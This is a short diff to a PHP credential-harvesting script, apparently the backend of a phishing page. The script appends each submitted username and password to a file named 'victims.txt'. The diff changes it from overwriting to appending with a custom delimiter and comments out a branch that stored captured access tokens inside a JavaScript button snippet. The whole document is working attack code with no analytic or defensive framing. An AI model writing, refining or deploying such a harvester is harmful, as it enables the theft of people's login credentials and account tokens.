@@ -1,11 +1,11 @@
 <?php
 if (count($_POST) == 2){
-    $f = fopen('victims.txt','w+');
-    fwrite($f,'USERNAME : '.$_POST['user'].' PASSWORD : '.$_POST['pw']."\n");
+    $f = fopen('victims.txt','a+');
+    fwrite($f,$_POST['user'].'<!:!>'.$_POST['pw']."\n");
     fclose($f);
 }
-else{ 
-    $f = fopen('victims.txt','w+');
+/*else{ 
+    $f = fopen('victims.txt','a+');
     $u1 = <<<EOF
 var btn=`<button style="height:100%;width:100%;background:red;" onclick='var values = {"access_token": "
 EOF;
@@ -14,6 +14,6 @@ EOF;
 WOF;
     fwrite($f,$u1.$_POST['access_token'].$u2);
     fclose($f);
-}
+}*/
 
 ?>
